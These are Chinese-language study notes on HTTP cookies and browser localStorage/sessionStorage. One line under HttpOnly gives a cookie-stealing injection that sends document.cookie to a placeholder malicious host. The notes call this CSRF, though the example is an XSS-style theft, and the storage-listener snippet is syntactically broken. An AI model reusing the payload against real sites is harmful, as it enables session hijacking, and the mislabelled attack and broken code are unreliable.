```javascript
Cookie 是服务器保存在浏览器的一小段文本信息，//一般30个键值对,4KB。
        由 HTTP 协议生成，也主要是供 HTTP 协议使用
        '浏览器每次向服务器发出请求，就会自动附上这段信息'
        主机端口一致(就可以共享 Cookie)
        //window.navigator.cookieEnabled // 浏览器是否打开 Cookie 功能    
用来:
    1.分辨两个请求是否来自同一个浏览器
    2.对话（session）管理：保存登录、购物车等需要记录的信息。
    3.个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
   4.追踪：记录和分析用户行为。  
       
           
Response时：//服务器在浏览器写入一个 Cookie
    生成     
        HTTP/1.0 200 OK
        Content-type: text/html
        Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
        Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
        Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
        Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>

        eg:
            Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
    修改
        服务器改早先设置的 Cookie，必须同时满足四个条件：
            Cookie 的key、domain、path和secure都匹配。
        Set-Cookie: key1=value1; domain=example.com; path=/blog
            //改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。
            Set-Cookie: key1=value2; domain=example.com; path=/blog
                //只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
                Set-Cookie: key1=value2; domain=example.com; path=/
                    //上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。
                        Request时:
                            Cookie: key1=value1; key1=value2
                        //上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面,path=/blog排在path=/ 前面。                
Request时: //浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器
    发送
        //每个请求都会带上相应的 Cookie
        GET /sample_page.html HTTP/1.1
        Host: www.example.org
        Cookie: yummy_cookie=choco; tasty_cookie=strawberry
        
        服务器无法知道
            1.Cookie 的各种属性，比如何时过期。
            2.Cookie到底是一级域名设的，还是某一个二级域名设的。
        
        
Cookie 的7个属性: depm ssh
    1 Domain(请求哪些域名需要带该cookie)
    2 Path(请求哪些路径需要带该cookie)  
        eg: PATH属性是'/'，那么请求'/docs'路径包含'/', 那它就需要带Cookie
        
    3 Expires(过期就删掉)
        //UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。
        Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; '浏览器根据本地时间，所以是不精确的'
    4 Max-Age(多少秒后删掉)
        '覆盖Expires'
    /如果不设置该Expires或Max-Age，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除/

        
    5 Secure(HTTPS才能发送该cooike)    
    6 HttpOnly(JS不能访问该cookie)
        防止(CRSF攻击)
        eg: 另一个网站注入了:(new Image()).src = "http://恶意网站/接收cookie?cookie=" + document.cookie;
            从而获取到我的cookie
    7 SameSite(A网站嵌入B的链接, 点击B链接会带B的cookie过去, 限制它)

document.cookie(用于读写当前网页的 Cookie)
    删除(唯一方法是expires搞过期)        

    增加(必须都写对才能成功增加,失败不提示的)
        一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加
            document.cookie = 'fontSize=14; '
                              + 'expires=' + someDate.toGMTString() + '; '
                              + 'path=/subdirectory; '
                              + 'domain=*.example.com';
            document.cookie = 'test2=world';
            document.cookie        // fontSize=14; test2=world                   
```



---

> 【浏览器存储】 WebStorage(localStorage)

```javascript
存储大小最大为5M
sessionStorage  保存的数据用于浏览器的一次会话（session）
    通过点击链接（或者用了 window.open）打开的新标签页之间是属于同一个 session 的，
    但新开一个标签页总是会初始化一个新的 session，即使网站是一样的，它们也不属于同一个 session
localStorage    保存的数据长期存在

    //增
    localStorage.val=1
    //查
    var a=localStorage.val //1
    //删
    localStorage.removeItem('val');

//监听
//!! 在同一个网页修改本地存储，又在同一个网页监听，这样是没有效果的
window.addEventListener('storage', (e) {
  console.log(e.key);//key/newValue/oldValue/storageArea所有键值对/url另一个页面触发storege的地址
});
```

